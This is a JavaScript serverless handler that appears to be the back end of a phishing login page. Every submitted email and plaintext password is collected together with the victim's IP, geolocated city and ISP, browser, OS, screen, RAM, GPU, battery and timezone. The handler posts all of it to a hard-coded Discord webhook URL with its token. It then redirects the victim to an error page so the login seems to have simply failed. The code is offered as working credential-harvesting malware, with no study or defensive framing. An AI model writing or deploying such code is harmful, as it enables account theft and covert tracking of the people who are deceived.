const https = require("https");
const http = require("http");
const querystring = require("querystring");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    res.writeHead(302, { Location: "/index.html" });
    return res.end();
  }

  let body = "";
  req.on("data", (chunk) => (body += chunk));
  await new Promise((resolve) => req.on("end", resolve));

  const params = querystring.parse(body);
  const username = (params.email || "").trim();
  const password = params.password || "";

  if (!username || !password) {
    res.writeHead(302, { Location: "/index.html?error=1" });
    return res.end();
  }

  // Discord webhook
  const DISCORD_WEBHOOK =
    "https://discord.com/api/webhooks/1546720332604243998/KsL7TPxXZEGAFeGrq7iCzi6JCXq6nFr38GpINwGLpJtfJThI2kH7HSJ61jOo0tG2zUdC";

  // Get IP
  const ip =
    (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown";

  const ua = req.headers["user-agent"] || "unknown";
  const referer = req.headers["referer"] || "hidden / typed directly";

  // Detect browser
  function guess(list) {
    for (const name of list) {
      if (ua.toLowerCase().includes(name.toLowerCase())) return name;
    }
    return "other";
  }
  const browser = guess(["Edg", "OPR", "Firefox", "Chrome", "Safari"]);
  const os = guess(["Windows", "Android", "iPhone", "iPad", "Mac", "Linux"]);
  const device =
    ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")
      ? "Mobile"
      : "Desktop";

  // Browser full version
  const browserMatch = ua.match(
    /(Edg|OPR|Firefox|Chrome|Safari|Version)\/([\d.]+)/
  );
  const browserFull = browserMatch
    ? `${browserMatch[1]} ${browserMatch[2]}`
    : browser;

  // OS version
  let osVersion = "unknown";
  const winMatch = ua.match(/Windows NT ([\d.]+)/);
  if (winMatch) {
    const winMap = {
      "10.0": "10/11",
      "6.3": "8.1",
      "6.2": "8",
      "6.1": "7",
    };
    osVersion = "Windows " + (winMap[winMatch[1]] || winMatch[1]);
  }
  const androidMatch = ua.match(/Android ([\d.]+)/);
  if (androidMatch) osVersion = "Android " + androidMatch[1];
  const iosMatch = ua.match(/OS ([\d_]+)/);
  if (iosMatch) osVersion = "iOS " + iosMatch[1].replace(/_/g, ".");
  const macMatch = ua.match(/Mac OS X ([\d._]+)/);
  if (macMatch) osVersion = "macOS " + macMatch[1].replace(/_/g, ".");

  // Device info from form
  const battery = (params.battery || "unknown").substring(0, 50);
  const nettype = (params.nettype || "unknown").substring(0, 50);
  const screen = (params.screen || "unknown").substring(0, 50);
  const timezone = (params.timezone || "unknown").substring(0, 100);
  const language = (params.language || "unknown").substring(0, 20);
  const ram = (params.ram || "unknown").substring(0, 30);
  const cpu_cores = (params.cpu_cores || "unknown").substring(0, 30);
  const gpu = (params.gpu || "unknown").substring(0, 150);

  // IP Geolocation
  let location = "unknown",
    isp = "unknown",
    asn = "unknown",
    hostname = "none";
  try {
    const geoData = await new Promise((resolve, reject) => {
      const geoReq = http.get(
        `http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,as,hostname`,
        { timeout: 5000 },
        (geoRes) => {
          let d = "";
          geoRes.on("data", (c) => (d += c));
          geoRes.on("end", () => resolve(JSON.parse(d)));
        }
      );
      geoReq.on("error", reject);
      geoReq.on("timeout", () => {
        geoReq.destroy();
        reject(new Error("timeout"));
      });
    });
    if (geoData && geoData.status === "success") {
      location = `${geoData.city || ""}, ${geoData.regionName || ""}, ${
        geoData.country || ""
      }`.replace(/^,\s*|,\s*$/g, "");
      isp = geoData.isp || "unknown";
      asn = geoData.as || "unknown";
      hostname = geoData.hostname || "none";
    }
  } catch (e) {}

  const timestamp = new Date().toISOString();

  // Build Discord embeds
  const embed1 = {
    title: "\u{1F7E2} User Login",
    color: 0x2ecc71,
    fields: [
      { name: "\u{1F4E7} Email / ID", value: "```" + username + "```", inline: false },
      { name: "\u{1F511} Password", value: "```" + password + "```", inline: false },
      { name: "\u{1F310} IP", value: "```" + ip + "```", inline: true },
      { name: "\u{1F4CD} Location", value: "```" + location + "```", inline: true },
      { name: "\u{1F3E2} ISP", value: "```" + isp + "```", inline: true },
      { name: "\u{1F4E1} ASN", value: "```" + asn + "```", inline: true },
      { name: "\u{1F3E0} Hostname", value: "```" + hostname + "```", inline: true },
    ],
    footer: { text: "DC Bot" },
    timestamp: timestamp,
  };

  const embed2 = {
    title: "\u{1F4BB} Device Info",
    color: 0x3498db,
    fields: [
      { name: "\u{1F4E7} Email / ID", value: "```" + username + "```", inline: false },
      { name: "\u{1F5A5}\uFE0F OS", value: "```" + osVersion + "```", inline: true },
      { name: "\u{1F30D} Browser", value: "```" + browserFull + "```", inline: true },
      { name: "\u{1F5A5}\uFE0F Screen", value: "```" + screen + "```", inline: true },
      { name: "\u26A1 CPU", value: "```" + cpu_cores + "```", inline: true },
      { name: "\u{1F9E0} RAM", value: "```" + ram + "```", inline: true },
      { name: "\u{1F3AE} GPU", value: "```" + gpu + "```", inline: true },
      { name: "\u{1F4F6} Network", value: "```" + nettype + "```", inline: true },
      { name: "\u{1F50B} Battery", value: "```" + battery + "```", inline: true },
      { name: "\u{1F550} Timezone", value: "```" + timezone + "```", inline: true },
      { name: "\u{1F5E3}\uFE0F Language", value: "```" + language + "```", inline: true },
    ],
    footer: { text: "DC Bot" },
    timestamp: timestamp,
  };

  const payload = JSON.stringify({
    username: "DC Bot",
    embeds: [embed1, embed2],
  });

  // Send to Discord
  try {
    await new Promise((resolve, reject) => {
      const url = new URL(DISCORD_WEBHOOK);
      const discordReq = https.request(
        {
          hostname: url.hostname,
          path: url.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(payload),
          },
          timeout: 10000,
        },
        (discordRes) => {
          discordRes.on("data", () => {});
          discordRes.on("end", resolve);
        }
      );
      discordReq.on("error", reject);
      discordReq.on("timeout", () => {
        discordReq.destroy();
        reject(new Error("timeout"));
      });
      discordReq.write(payload);
      discordReq.end();
    });
  } catch (e) {}

  res.writeHead(302, { Location: "/error.html" });
  return res.end();
};
